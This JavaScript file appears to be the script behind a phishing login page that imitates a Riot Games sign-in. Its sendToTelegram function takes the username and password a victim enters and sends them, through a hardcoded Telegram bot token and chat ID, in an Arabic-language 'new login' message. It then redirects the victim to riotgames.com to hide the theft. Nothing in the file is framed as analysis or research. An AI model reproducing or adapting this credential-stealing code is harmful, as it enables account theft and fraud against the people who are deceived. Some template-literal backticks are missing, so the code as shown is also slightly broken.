function handleInput(input) {
    const span = input.previousElementSibling;
    if (input.value !== "") {
        span.style.opacity = "0";
    } else {
        span.style.opacity = "1";
    }

    checkInputs();
}

function checkInputs() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    const loginBtn = document.getElementById("login-btn");

    if (username !== "" && password !== "") {
        loginBtn.removeAttribute("disabled");
    } else {
        loginBtn.setAttribute("disabled", "true");
    }
}

function sendToTelegram() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if (username === "" || password === "") {
        return;
    }

    const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
    const chatId = "6687453395";
    const message = 🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password};

    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

    fetch(url)
        .then(() => {
            window.location.href = "https://www.riotgames.com/";
        })
        .catch(error => console.error("Error sending to Telegram:", error));
}
